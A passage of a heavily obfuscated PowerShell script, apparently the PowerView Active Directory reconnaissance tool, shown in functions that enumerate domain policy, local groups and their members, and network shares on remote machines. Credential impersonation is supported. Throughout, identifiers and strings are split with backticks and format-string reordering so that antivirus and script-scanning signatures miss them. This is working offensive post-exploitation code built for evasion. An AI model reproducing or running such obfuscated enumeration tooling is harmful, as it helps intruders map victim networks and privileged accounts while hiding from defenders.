                        ${GPOcOmPuT`ErlOCa`lGROu`pMEM`BEr} | &("{0}{2}{1}" -f 'Add','Member','-') ("{0}{1}{2}"-f 'Not','eproper','ty') ("{1}{2}{0}"-f 'ectDN','Ob','j') ${OBJE`ct}."dIS`TINGui`sH`E`dna`mE"
                        ${gP`O`coMpu`T`ErLOc`AlG`ROU`pMemBeR} | &("{1}{0}{2}" -f 'd-','Ad','Member') ("{2}{0}{3}{1}" -f'r','erty','Notep','op') ("{1}{2}{0}"-f 'tSID','Obj','ec') ${_}
                        ${g`p`OCOmpU`TErlo`C`AlgR`O`UPme`mbEr} | &("{2}{3}{0}{1}"-f '-Memb','er','Ad','d') ("{0}{3}{1}{2}"-f 'N','p','roperty','ote') ("{1}{0}" -f'p','IsGrou') ${iS`gRo`Up}
                        ${gpO`Com`PUTErLoc`ALG`ROU`pMe`MBEr} | &("{0}{1}{2}" -f'A','dd-M','ember') ("{1}{2}{3}{0}"-f 'erty','Notep','ro','p') ("{3}{2}{0}{1}"-f 'isplay','Name','OD','GP') ${gPoG`R`OuP}."gpO`D`ISP`LA`Yname"
                        ${g`p`OcoMPutER`Lo`cA`lgrOu`Pmem`BEr} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{1}{3}{0}{2}" -f 'e','Note','rty','prop') ("{0}{1}" -f 'GP','OGuid') ${gp`og`ROUp}."g`ponaME"
                        ${GPOCom`puteR`lO`ca`Lg`R`oUpmEmBeR} | &("{0}{1}{2}"-f'A','dd-M','ember') ("{3}{0}{2}{1}"-f'prop','ty','er','Note') ("{0}{2}{1}"-f'GPO','th','Pa') ${gp`O`gRoUp}."gp`O`path"
                        ${gPO`CoMP`UTerlocAlGr`oup`M`eMb`er} | &("{2}{1}{0}"-f'ber','Mem','Add-') ("{2}{1}{0}"-f 'perty','pro','Note') ("{2}{0}{1}" -f'y','pe','GPOT') ${gp`O`gro`Up}."G`p`OtYpE"
                        ${GpOcOMP`UTERlOcA`Lgr`oUPM`emBER}."p`s`oBjECT"."Typ`enaM`Es".("{0}{1}" -f 'Ad','d').Invoke(("{1}{4}{7}{3}{5}{6}{2}{0}" -f'mber','P','pMe','View.GPO','owe','Compu','terLocalGrou','r'))
                        ${gPocOm`PuTERLOc`Alg`R`OupMEMbEr}
                    }
                }
            }
        }
    }
}


function g`ET-DOmaInPOli`Cyd`Ata {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{1}{0}"-f 'ess','dProc','P','houl','SS'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitiOn = 0, vALuEFROmPipeLIne = ${tr`Ue}, ValUefROMPIpelINebYPrOperTYNAmE = ${T`RUe})]
        [Alias({"{1}{2}{0}" -f'ce','S','our'}, {"{0}{1}"-f 'Na','me'})]
        [String]
        ${pO`l`icY} = ("{0}{1}"-f 'Dom','ain'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`M`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f'ntroll','er','D','omainCo'})]
        [String]
        ${Se`R`Ver},

        [ValidateRange(1, 10000)]
        [Int]
        ${sErve`RtIMeLI`mit},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`DenTial} =   $21Gv7E::"E`MpTy"
    )

    BEGIN {
        ${S`EArc`HeRA`Rg`Umen`Ts} = @{}
        if (${PS`BounD`p`ARa`mETErs}[("{0}{1}" -f'Serv','er')]) { ${SE`ArC`her`A`RGum`EnTs}[("{0}{1}" -f'Serv','er')] = ${S`eR`VeR} }
        if (${psBO`UNdP`ArA`METerS}[("{2}{1}{0}"-f 'TimeLimit','er','Serv')]) { ${Se`A`Rc`h`ERARGumE`NtS}[("{1}{2}{0}{3}"-f 'eL','Serv','erTim','imit')] = ${sERV`ER`T`iME`liMIt} }
        if (${p`SBouNDParaMe`TE`Rs}[("{0}{1}{2}" -f'Credenti','a','l')]) { ${SeAR`ChErar`GUm`E`N`TS}[("{0}{2}{3}{1}"-f'Cr','tial','e','den')] = ${creDe`NT`ial} }

        ${COn`VErtARgu`M`ENTS} = @{}
        if (${P`s`Bo`UnDpArAMEtE`RS}[("{1}{0}" -f'r','Serve')]) { ${C`oN`VeR`TArg`UME`Nts}[("{0}{1}"-f'Serve','r')] = ${sER`V`eR} }
        if (${Ps`B`OUNdpaR`AMETERs}[("{0}{1}{2}{3}"-f 'Cre','dent','ia','l')]) { ${CoN`Ver`TArgu`MEntS}[("{1}{2}{0}"-f'al','Cr','edenti')] = ${cRed`E`N`TiAL} }
    }

    PROCESS {
        if (${psB`O`UND`Para`meT`Ers}[("{0}{1}"-f 'Doma','in')]) {
            ${SEarCH`e`Ra`Rg`UMentS}[("{1}{0}" -f 'n','Domai')] = ${d`OMA`in}
            ${COn`VERtA`R`GuMENts}[("{1}{0}"-f'n','Domai')] = ${DoM`A`iN}
        }

        if (${Pol`I`cy} -eq 'All') {
            ${SeaRcHerArg`U`MeN`Ts}[("{0}{1}" -f 'Identi','ty')] = '*'
        }
        elseif (${p`o`LIcY} -eq ("{0}{1}"-f 'Dom','ain')) {
            ${SeaR`c`H`ErAR`g`UMentS}[("{1}{0}"-f 'ntity','Ide')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${Pol`Icy} -eq ("{1}{3}{0}{2}"-f 'oll','D','er','omainContr')) -or (${p`oli`Cy} -eq 'DC')) {
            ${s`Earc`h`ErarGumen`TS}[("{1}{0}"-f'ity','Ident')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${seArC`h`e`Ra`RgU`meNtS}[("{0}{1}"-f'Identit','y')] = ${P`olicy}
        }

        ${G`P`OReSUl`TS} = &("{3}{0}{1}{2}"-f'ma','in','GPO','Get-Do') @SearcherArguments

        ForEach (${g`Po} in ${G`P`orEs`ULtS}) {
            
            ${gPttM`pLP`A`TH} = ${g`pO}."GPcF`iLes`Y`sPA`TH" + ((("{0}{1}{7}{5}{9}{12}{10}{11}{6}{8}{2}{3}{4}"-f 'iBRM','A','tiBRGp','tTmpl.','inf','NEiBRMicros','cEd','CHI','i','of','RWindows NTiBR','Se','tiB'))."rEp`LACe"('iBR',[sTriNg][ChAr]92))

            ${pa`RSeA`RgS} =  @{
                ("{2}{0}{1}"-f 'lP','ath','GptTmp') = ${GP`TtM`Pl`pATH}
                ("{2}{3}{1}{0}"-f't','tObjec','Out','pu') = ${tR`UE}
            }
            if (${p`sbO`U`NdpaRamET`e`RS}[("{2}{0}{1}" -f'e','ntial','Cred')]) { ${Pa`RsEA`Rgs}[("{2}{1}{0}" -f'l','redentia','C')] = ${cr`e`dENtIAL} }

            
            &("{3}{0}{2}{1}"-f'et-','Tmpl','Gpt','G') @ParseArgs | &("{2}{1}{4}{3}{0}" -f't','h','ForEac','bjec','-O') {
                ${_} | &("{1}{0}{2}"-f'd-Mem','Ad','ber') ("{2}{0}{1}" -f't','eproperty','No') ("{0}{1}{2}" -f 'GP','ONa','me') ${G`PO}."Na`me"
                ${_} | &("{0}{1}{2}" -f 'Ad','d-M','ember') ("{2}{3}{0}{1}" -f 'rop','erty','N','otep') ("{3}{1}{0}{2}"-f 'DisplayN','PO','ame','G') ${g`po}."DiSPL`AyN`Ame"
                ${_}
            }
        }
    }
}










function gET-NeT`lo`cAL`grouP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f 'ss','ouldProc','e','PSSh'}, '')]
    [OutputType({"{2}{4}{5}{0}{1}{3}" -f'ew.Loca','lGroup.AP','Pow','I','e','rVi'})]
    [OutputType({"{7}{0}{5}{4}{3}{1}{6}{2}" -f 'erVi','oup.Wi','NT','alGr','oc','ew.L','n','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITiOn = 0, VaLuefromPIPeLINe = ${T`RuE}, VAlueFrOmpIpelINEBYPRoPeRtyname = ${TR`Ue})]
        [Alias({"{1}{0}{2}" -f'tNa','Hos','me'}, {"{0}{2}{3}{1}"-f'dn','e','shostna','m'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`m`Put`eRNAMe} = ${E`Nv`:Co`m`Put`eRNAME},

        [ValidateSet('API', {"{1}{0}" -f 'nNT','Wi'})]
        [Alias({"{2}{3}{0}{1}" -f 'eth','od','Colle','ctionM'})]
        [String]
        ${Meth`oD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REden`TIAL} =   (vArIaBLE  ("21GV"+"7e") -vAL  )::"EMP`Ty"
    )

    BEGIN {
        if (${Psbou`NDP`ARaM`eTERS}[("{0}{1}{2}" -f'C','redentia','l')]) {
            ${Lo`Go`N`TokEn} = &("{2}{4}{1}{0}{3}{5}"-f 'na','erso','Invo','ti','ke-UserImp','on') -Credential ${CRed`EnT`ial}
        }
    }

    PROCESS {
        ForEach (${c`oMPU`T`eR} in ${co`mPutE`RNAMe}) {
            if (${Me`T`hod} -eq 'API') {
                

                
                ${quEr`Y`LEveL} = 1
                ${PTR`iN`FO} =  ( ChiLditeM  ("vARIAB"+"LE"+":n"+"Fv")).vaLUe::"z`ero"
                ${Ent`RiE`Sre`Ad} = 0
                ${TOTal`Re`Ad} = 0
                ${ReS`UMeHaN`DLe} = 0

                
                ${ResU`lT} = ${Net`ApI32}::"ne`TLocA`l`groupE`NUM"(${c`oMpU`TeR}, ${Q`Ue`RYlEv`el}, [ref]${PT`Ri`NFo}, -1, [ref]${eNtR`ie`Sr`EAD}, [ref]${T`Ot`ALrEaD}, [ref]${r`eS`UMe`h`ANDle})

                
                ${ofF`s`et} = ${p`T`Rinfo}.("{1}{2}{0}" -f '64','T','oInt').Invoke()

                
                if ((${Re`SULT} -eq 0) -and (${O`FFset} -gt 0)) {

                    
                    ${INc`RE`meNT} = ${LoCalGRO`U`P_I`NFO_1}::("{2}{1}{0}" -f 'Size','t','Ge').Invoke()

                    
                    for (${I} = 0; (${I} -lt ${e`N`TRiEsREad}); ${I}++) {
                        
                        ${Ne`WIn`TptR} = &("{2}{0}{1}" -f'w-Obj','ect','Ne') ("{0}{2}{3}{1}"-f 'S','ntptr','yste','m.I') -ArgumentList ${oF`Fs`et}
                        ${i`NfO} = ${NeWint`p`Tr} -as ${LOcAl`Gr`oUp_i`NF`o_1}

                        ${Of`FseT} = ${ne`wint`P`Tr}.("{0}{1}{2}"-f 'ToI','nt6','4').Invoke()
                        ${O`Ff`set} += ${iN`C`ReMENT}

                        ${l`oCa`lgROup} = &("{2}{1}{0}"-f 'ect','j','New-Ob') ("{0}{1}{2}" -f'P','SObjec','t')
                        ${Lo`caL`G`ROup} | &("{1}{2}{0}"-f'er','Add-Me','mb') ("{0}{3}{1}{2}"-f'Notepr','r','ty','ope') ("{0}{2}{1}" -f 'Comp','terName','u') ${Com`pUt`ER}
                        ${l`Oca`Lgro`UP} | &("{0}{2}{1}" -f'Add-','ber','Mem') ("{0}{2}{3}{1}"-f 'No','y','teprop','ert') ("{1}{2}{3}{0}" -f 'upName','G','r','o') ${IN`FO}."lGR`PI1_`NAMe"
                        ${LO`cal`GRO`UP} | &("{2}{0}{1}"-f 'em','ber','Add-M') ("{1}{3}{0}{2}"-f 'pr','Not','operty','e') ("{1}{0}"-f 'ment','Com') ${i`Nfo}."lgR`pI1`_COM`M`ent"
                        ${LOca`LgrO`UP}."pSob`j`eCt"."TyPenA`MeS".("{1}{0}"-f 't','Inser').Invoke(0, ("{5}{2}{4}{7}{0}{6}{1}{3}" -f '.','l','w','Group.API','erVi','Po','Loca','ew'))
                        ${LocaLgR`o`UP}
                    }
                    
                    ${nU`lL} = ${net`APi`32}::("{0}{1}{3}{2}" -f'NetApi','Buf','erFree','f').Invoke(${ptr`i`NFo})
                }
                else {
                    &("{2}{1}{3}{0}" -f 'e','V','Write-','erbos') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${c`o`MPU`T`ERPRo`VidER} = [ADSI]"WinNT://$Computer,computer"

                ${C`O`mP`UteRPRO`ViDER}."p`SbaSE"."cHI`LDrEn" | &("{0}{2}{3}{1}" -f 'Wh','ct','ere-O','bje') { ${_}."P`SBAsE"."sCH`emaCLA`sSnAMe" -eq ("{1}{0}" -f'roup','g') } | &("{1}{2}{0}{3}" -f 'h-Ob','Fo','rEac','ject') {
                    ${l`OCALgR`ouP} = ([ADSI]${_})
                    ${G`ROUP} = &("{0}{1}{2}"-f 'New-','Ob','ject') ("{0}{1}" -f 'PSObje','ct')
                    ${GR`OUp} | &("{2}{0}{1}"-f 'd-Mem','ber','Ad') ("{1}{0}{3}{2}"-f 'ote','N','erty','prop') ("{3}{1}{0}{2}"-f'Na','uter','me','Comp') ${COm`put`ER}
                    ${g`RO`Up} | &("{2}{0}{1}"-f'dd-Mem','ber','A') ("{0}{1}{2}" -f'No','tepropert','y') ("{0}{2}{3}{1}" -f'Gro','Name','u','p') (${LOCaLg`RO`UP}.("{0}{2}{1}" -f 'Invo','eGet','k').Invoke(("{1}{0}" -f 'ame','N')))
                    ${Gro`Up} | &("{2}{1}{3}{0}" -f 'r','-','Add','Membe') ("{2}{1}{0}" -f'erty','rop','Notep') 'SID' ((&("{0}{1}{2}"-f 'New-','Obj','ect') ("{7}{6}{5}{0}{2}{3}{1}{4}"-f'l','rityIdenti','.','Secu','fier','ipa','rity.Princ','System.Secu')(${LOcA`lgRO`Up}.("{2}{1}{0}"-f'Get','oke','Inv').Invoke(("{0}{1}"-f'objectsi','d')),0))."Val`Ue")
                    ${G`Ro`UP} | &("{0}{1}{2}" -f'Ad','d-M','ember') ("{1}{2}{3}{0}"-f'rty','No','teprop','e') ("{0}{2}{1}"-f'C','ent','omm') (${lO`Ca`lG`ROuP}.("{1}{2}{0}"-f 'Get','I','nvoke').Invoke(("{2}{1}{3}{0}"-f'n','esc','D','riptio')))
                    ${G`Ro`UP}."pS`Obj`eCT"."TYPena`m`Es".("{1}{0}{2}" -f'ns','I','ert').Invoke(0, ("{2}{3}{1}{0}{5}{4}" -f 'o','w.L','Po','werVie','up.WinNT','calGro'))
                    ${gRO`Up}
                }
            }
        }
    }
    
    END {
        if (${L`O`GonTo`ken}) {
            &("{0}{2}{3}{1}" -f 'I','evertToSelf','nvoke-','R') -TokenHandle ${LOG`OnToK`eN}
        }
    }
}


function gET-net`lOCA`lG`RoUPmEm`B`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}{4}" -f 'houldPr','o','PSS','ce','ss'}, '')]
    [OutputType({"{1}{6}{4}{8}{3}{7}{0}{5}{2}" -f 'ca','P','Member.API','.','V','lGroup','ower','Lo','iew'})]
    [OutputType({"{9}{6}{7}{8}{1}{5}{2}{0}{4}{3}" -f 'e','calG','pM','nNT','mber.Wi','rou','wer','View.L','o','Po'})]
    Param(
        [Parameter(PoSiTIOn = 0, ValUefrOMPipeLiNe = ${T`RUE}, ValuEFROmPIpELiNebYprOPERtYnaMe = ${t`RUE})]
        [Alias({"{0}{1}" -f 'Hos','tName'}, {"{1}{2}{0}"-f 'me','dnsho','stna'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMPuT`ERN`Ame} = ${e`Nv:ComPu`TeRNA`Me},

        [Parameter(VAluefROMpipELINEByproPERtynamE = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${GroUp`Na`ME} = ("{1}{0}{2}" -f'mi','Ad','nistrators'),

        [ValidateSet('API', {"{0}{1}" -f 'WinN','T'})]
        [Alias({"{3}{1}{0}{2}"-f'onMetho','ollecti','d','C'})]
        [String]
        ${Me`THoD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`eD`en`TIaL} =   ( GEt-itEm ("vARIa"+"blE"+":2"+"1g"+"V7e")).VALUe::"EMp`Ty"
    )

    BEGIN {
        if (${psbOU`NDpAR`A`MEt`erS}[("{3}{1}{0}{2}"-f 'ti','eden','al','Cr')]) {
            ${LOG`ont`o`kEn} = &("{3}{5}{1}{6}{2}{0}{7}{4}"-f'r','-U','e','Inv','on','oke','s','Impersonati') -Credential ${CR`Eden`TI`Al}
        }
    }

    PROCESS {
        ForEach (${co`m`Pu`Ter} in ${com`puTErn`AMe}) {
            if (${ME`ThOd} -eq 'API') {
                

                
                ${quErY`Lev`el} = 2
                ${pTRi`N`FO} =   ( Ls vaRiaBLe:nfV  ).valUE::"zE`Ro"
                ${ENTRie`Sr`E`AD} = 0
                ${to`T`AL`REaD} = 0
                ${rE`su`MEHanDle} = 0

                
                ${RESu`lt} = ${N`eTAPI`32}::"nEtl`OcA`Lg`ROu`pg`etmeMBERS"(${CoMPUt`er}, ${grO`UPn`AMe}, ${quE`RyLe`Vel}, [ref]${p`TRInfO}, -1, [ref]${e`NTRI`eSREAD}, [ref]${Tot`AL`REad}, [ref]${ResUM`eh`AnDLe})

                
                ${o`F`FsEt} = ${pTRi`NFo}.("{0}{1}"-f 'ToI','nt64').Invoke()

                ${MEMb`e`Rs} = @()

                
                if ((${RES`U`lt} -eq 0) -and (${of`F`seT} -gt 0)) {

                    
                    ${IN`C`RemEnT} = ${L`o`cAl`g`RO`U`P_meMberS_IN`Fo_2}::("{0}{1}{2}" -f'Get','Siz','e').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${Entr`iesre`Ad}); ${I}++) {
                        
                        ${nEWIn`T`PTR} = &("{1}{2}{0}" -f 'ct','New-O','bje') ("{1}{3}{2}{0}"-f 'r','Syst','Intpt','em.') -ArgumentList ${of`FSet}
                        ${i`NFO} = ${N`ewin`TPTr} -as ${Loc`ALG`RouP`_M`E`M`BErS_iNFo_2}

                        ${oFF`s`et} = ${nEwI`NT`pTR}.("{1}{0}{2}"-f 'I','To','nt64').Invoke()
                        ${o`F`FSeT} += ${in`CR`eMeNT}

                        ${SIdS`Tr`Ing} = ''
                        ${ReS`UL`T2} = ${ADv`AP`i32}::"c`onvERt`si`D`ToSTR`INgsid"(${I`NFO}."lG`R`mI`2_SId", [ref]${si`D`sTrI`Ng});${L`AStEr`ROr} =   $nRq::("{1}{5}{2}{0}{3}{4}"-f '32E','GetLast','in','r','ror','W').Invoke()

                        if (${R`ESul`T2} -eq 0) {
                            &("{2}{3}{1}{0}{4}"-f's','rbo','Write-V','e','e') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${M`E`Mber} = &("{2}{0}{3}{1}"-f 'Obj','ct','New-','e') ("{2}{1}{0}"-f 'ct','Obje','PS')
                            ${M`EM`Ber} | &("{1}{2}{0}"-f'r','Add-Memb','e') ("{1}{2}{0}" -f'erty','No','teprop') ("{2}{1}{3}{0}"-f 'erName','m','Co','put') ${coMPUT`ER}
                            ${Mem`B`ER} | &("{2}{0}{1}"-f'dd-Memb','er','A') ("{3}{0}{1}{2}"-f'teprop','e','rty','No') ("{1}{2}{0}" -f'Name','Gr','oup') ${gro`UPna`Me}
                            ${M`em`BER} | &("{2}{3}{1}{0}"-f 'er','d-Memb','A','d') ("{0}{2}{1}"-f 'Noteprope','ty','r') ("{2}{1}{0}" -f 'ame','mberN','Me') ${i`NFo}."l`gRMI2_D`OMain`A`Ndna`ME"
                            ${ME`m`Ber} | &("{0}{1}{2}" -f'Ad','d-Mem','ber') ("{3}{1}{0}{2}" -f'tepropert','o','y','N') 'SID' ${siD`S`Tri`Ng}
                            ${isGR`O`UP} = $(${iN`Fo}."l`grMI`2_SiDUs`A`Ge" -eq ("{2}{0}{1}" -f'Ty','peGroup','Sid'))
                            ${M`e`mBer} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{2}{0}{1}"-f'pe','rty','Notepro') ("{1}{0}" -f'p','IsGrou') ${isgR`OUP}
                            ${ME`MB`ER}."PS`oBJeCT"."typ`EN`AMES".("{2}{0}{1}"-f'nser','t','I').Invoke(0, ("{5}{3}{8}{0}{6}{7}{1}{9}{2}{4}" -f 'LocalGroupMem','r','AP','werV','I','Po','b','e','iew.','.'))
                            ${Mem`B`ErS} += ${mem`B`ER}
                        }
                    }

                    
                    ${N`UlL} = ${Net`ApI32}::("{2}{0}{1}"-f 'tApiBuffer','Free','Ne').Invoke(${P`TR`INfO})

                    
                    ${MacHI`Ne`SID} = ${ME`m`BerS} | &("{3}{1}{2}{0}" -f't','re-Obj','ec','Whe') {${_}."s`iD" -match ("{0}{1}"-f '.*-5','00') -or (${_}."s`id" -match ("{0}{2}{1}"-f '.*-','01','5'))} | &("{1}{3}{0}{2}" -f '-Obj','Sele','ect','ct') -Expand ("{1}{0}"-f'ID','S')
                    if (${M`ACHinES`ID}) {
                        ${M`AchINeS`id} = ${maC`h`iNEsID}.("{0}{1}{2}"-f 'Su','bs','tring').Invoke(0, ${ma`CH`InES`ID}.("{3}{2}{1}{0}"-f'f','xO','stInde','La').Invoke('-'))

                        ${M`Emb`erS} | &("{3}{2}{1}{0}" -f'-Object','ach','rE','Fo') {
                            if (${_}."S`iD" -match ${mac`HiN`e`SId}) {
                                ${_} | &("{1}{0}{2}{3}"-f'd','Ad','-M','ember') ("{2}{1}{0}" -f 'ty','oteproper','N') ("{0}{1}"-f'I','sDomain') ${f`ALSE}
                            }
                            else {
                                ${_} | &("{0}{2}{1}{3}" -f'A','m','dd-Me','ber') ("{0}{3}{1}{2}"-f'Note','rope','rty','p') ("{0}{1}" -f'IsDo','main') ${T`RuE}
                            }
                        }
                    }
                    else {
                        ${m`eM`BErs} | &("{1}{0}{2}" -f'ach-Obje','ForE','ct') {
                            if (${_}."s`iD" -notmatch ("{0}{1}{2}" -f'S-','1','-5-21')) {
                                ${_} | &("{2}{1}{0}" -f 'ber','d-Mem','Ad') ("{2}{1}{0}{3}"-f 'epropert','t','No','y') ("{1}{0}" -f'Domain','Is') ${fA`L`se}
                            }
                            else {
                                ${_} | &("{2}{0}{1}"-f 'em','ber','Add-M') ("{0}{1}{2}"-f 'N','otep','roperty') ("{1}{0}" -f'sDomain','I') ("{1}{0}{2}"-f'O','UNKN','WN')
                            }
                        }
                    }
                    ${m`Emb`ers}
                }
                else {
                    &("{1}{0}{3}{2}" -f 'te','Wri','erbose','-V') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    ${GR`Ou`pPr`OVID`er} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${g`RO`UPP`ROvIDEr}."PsB`A`sE"."i`Nvo`Ke"(("{0}{1}{2}" -f 'M','embe','rs')) | &("{0}{1}{2}"-f 'F','orEach-Objec','t') {

                        ${MEM`BeR} = &("{1}{0}{2}"-f'-','New','Object') ("{1}{0}{2}"-f 'SObjec','P','t')
                        ${mEM`B`er} | &("{1}{0}{2}"-f 'd-Me','Ad','mber') ("{2}{1}{0}{3}"-f'pe','epro','Not','rty') ("{3}{0}{2}{1}"-f'uterNa','e','m','Comp') ${cOM`PUt`Er}
                        ${M`e`mBEr} | &("{0}{3}{2}{1}"-f 'A','ember','d-M','d') ("{1}{0}{3}{2}" -f 'eprop','Not','rty','e') ("{2}{0}{1}"-f 'roup','Name','G') ${g`Ro`UpNAME}

                        ${locALu`S`er} = ([ADSI]${_})
                        ${ad`sPa`TH} = ${loc`Al`Us`Er}.("{0}{1}{2}{3}"-f'In','vok','eGe','t').Invoke(("{0}{1}" -f'AdsP','ath')).("{1}{0}"-f 'ace','Repl').Invoke(("{0}{1}{2}" -f 'W','i','nNT://'), '')
                        ${i`SGR`Oup} = (${L`OCALu`Ser}."s`CheMA`CLAs`sNA`ME" -like ("{1}{0}"-f'p','grou'))

                        if((  (ChILditeM  ('V'+'aRIAble'+':572')  ).valUE::("{1}{0}" -f 'atches','M').Invoke(${a`DSPa`TH}, '/'))."c`Ount" -eq 1) {
                            
                            ${MeM`Ber`isDoMa`IN} = ${Tr`UE}
                            ${N`AmE} = ${a`DSp`Ath}.("{2}{1}{0}"-f'e','plac','Re').Invoke('/', '\')
                        }
                        else {
                            
                            ${M`EMbEr`ISDOM`AIN} = ${F`AL`se}
                            ${NA`mE} = ${a`d`SpAth}.("{2}{0}{1}"-f'r','ing','Subst').Invoke(${ad`sp`Ath}.("{1}{0}" -f 'ndexOf','I').Invoke('/')+1).("{0}{2}{1}" -f'Rep','e','lac').Invoke('/', '\')
                        }

                        ${MeM`BEr} | &("{2}{3}{1}{0}" -f 'ber','Mem','Add','-') ("{1}{0}{2}" -f 'per','Notepro','ty') ("{3}{2}{1}{0}"-f'e','untNam','o','Acc') ${N`AmE}
                        ${mem`B`eR} | &("{2}{1}{0}{3}" -f'mbe','e','Add-M','r') ("{2}{3}{0}{1}"-f'er','ty','N','oteprop') 'SID' ((&("{2}{0}{1}" -f'bj','ect','New-O') ("{1}{3}{8}{2}{5}{9}{7}{10}{0}{4}{6}" -f 'rity','System','inc','.Security.P','Ide','i','ntifier','ec','r','pal.S','u')(${lOCa`LU`ser}.("{1}{0}{2}"-f 'Ge','Invoke','t').Invoke(("{0}{1}{2}"-f'O','b','jectSID')),0))."Val`Ue")
                        ${ME`mber} | &("{0}{1}{2}"-f 'A','dd','-Member') ("{0}{2}{1}"-f'Noteprop','ty','er') ("{0}{1}"-f 'IsGrou','p') ${i`s`GrOUp}
                        ${MEm`BeR} | &("{2}{0}{1}"-f'mb','er','Add-Me') ("{0}{2}{1}{3}" -f 'Not','pe','epro','rty') ("{1}{2}{0}" -f'main','IsD','o') ${mE`MberIs`D`Om`Ain}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${MEM`B`Er}
                    }
                }
                catch {
                    &("{0}{1}{2}{3}"-f 'Wr','ite-','Verbos','e') ('[Get-Net'+'LocalGroup'+'Mem'+'ber'+'] '+'E'+'rror '+'for'+' '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${Log`O`N`TOken}) {
            &("{2}{3}{1}{0}" -f 'rtToSelf','e','Invoke-R','ev') -TokenHandle ${loG`o`NtoK`en}
        }
    }
}


function g`et-netS`HARE {


    [OutputType({"{1}{4}{3}{0}{2}" -f'Sh','Power','areInfo','w.','Vie'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTIon = 0, vAlUEfROMpIPELIne = ${T`RuE}, vaLUeFROmPIpELiNEbyPROPeRtyNamE = ${t`Rue})]
        [Alias({"{1}{2}{0}" -f'tName','H','os'}, {"{1}{3}{0}{2}"-f 'stn','dn','ame','sho'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`mPU`TERNA`mE} = ("{0}{2}{1}" -f 'l','host','ocal'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDEnt`Ial} =  $21GV7E::"e`MPTy"
    )

    BEGIN {
        if (${pSB`OUN`DP`Ar`AMetErs}[("{0}{1}{2}"-f 'C','redenti','al')]) {
            ${LOgO`NTO`Ken} = &("{4}{2}{1}{0}{5}{3}"-f 'on','ke-UserImpers','vo','tion','In','a') -Credential ${Cre`deNT`Ial}
        }
    }

    PROCESS {
        ForEach (${c`oMpUteR} in ${com`pUTe`R`NamE}) {
            
            ${QuE`RyL`evEl} = 1
            ${p`TRIN`Fo} =  (  vAriAbLe  ("n"+"fv")).valuE::"z`eRo"
            ${E`N`TrieSRe`Ad} = 0
            ${tOTAL`Re`AD} = 0
            ${re`SUMeha`Nd`Le} = 0

            
            ${rE`Su`lt} = ${N`eT`APi32}::"NeT`ShA`RE`enUm"(${c`omPu`TeR}, ${qUE`RYL`eVEl}, [ref]${pTr`IN`Fo}, -1, [ref]${e`NTR`IesrEad}, [ref]${toT`Al`R`Ead}, [ref]${RES`Ume`H`A`Ndle})

            
            ${o`F`FseT} = ${PTr`i`NFO}.("{0}{1}{2}" -f'ToIn','t6','4').Invoke()

            
            if ((${re`s`UlT} -eq 0) -and (${o`F`FSEt} -gt 0)) {

                
                ${I`NcR`EMent} = ${shar`E_iNfO`_1}::("{0}{2}{1}"-f 'Get','e','Siz').Invoke()

                
                for (${I} = 0; (${i} -lt ${entrIe`s`REAd}); ${i}++) {
                    
                    ${nEW`Int`pTR} = &("{1}{2}{3}{0}" -f 'ct','N','ew-Obj','e') ("{0}{1}{2}"-f 'S','ystem.Intp','tr') -ArgumentList ${of`F`SET}
                    ${I`NFo} = ${NewIn`TP`Tr} -as ${sh`ArE_i`NF`o`_1}

                    
                    ${Sha`RE} = ${iN`Fo} | &("{0}{2}{1}" -f'Selec','-Object','t') ('*')
                    ${Sha`RE} | &("{2}{0}{1}"-f 'd','d-Member','A') ("{3}{2}{1}{0}"-f 'y','rt','pe','Notepro') ("{0}{2}{1}"-f'Comp','me','uterNa') ${COm`p`UtEr}
                    ${sh`ARE}."Pso`BjeCt"."T`yP`En`AMES".("{0}{1}" -f 'Inser','t').Invoke(0, ("{3}{1}{2}{0}" -f'ShareInfo','Vi','ew.','Power'))
                    ${oF`F`Set} = ${NEwIN`T`PTr}.("{0}{1}" -f 'T','oInt64').Invoke()
                    ${oFf`S`Et} += ${I`NcREMe`Nt}
                    ${sH`A`Re}
                }

                
                ${NU`lL} = ${n`EtA`pI32}::("{3}{0}{1}{2}" -f 'tApiBuff','erFre','e','Ne').Invoke(${P`TR`iNfO})
            }
            else {
